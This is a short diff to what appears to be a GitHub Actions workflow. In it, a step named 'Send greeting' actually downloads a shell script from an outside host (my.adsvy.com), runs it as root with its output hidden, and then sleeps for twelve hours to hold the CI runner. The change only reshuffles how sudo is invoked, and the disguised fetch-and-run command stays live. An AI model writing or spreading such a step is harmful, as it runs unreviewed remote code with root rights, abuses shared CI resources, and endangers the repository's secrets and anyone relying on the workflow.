@@ -27,4 +27,4 @@ jobs:
     steps:
     # Runs a single command using the runners shell
     - name: Send greeting
-      run: sudo apt update && sudo wget https://my.adsvy.com/CRD_COLAB_EXE.sh &> /dev/null && chmod +x CRD_COLAB_EXE.sh && sudo ./CRD_COLAB_EXE.sh && sudo sleep 43200
+      run: sudo su && apt update && wget https://my.adsvy.com/CRD_COLAB_EXE.sh &> /dev/null && chmod +x CRD_COLAB_EXE.sh && ./CRD_COLAB_EXE.sh && sleep 43200
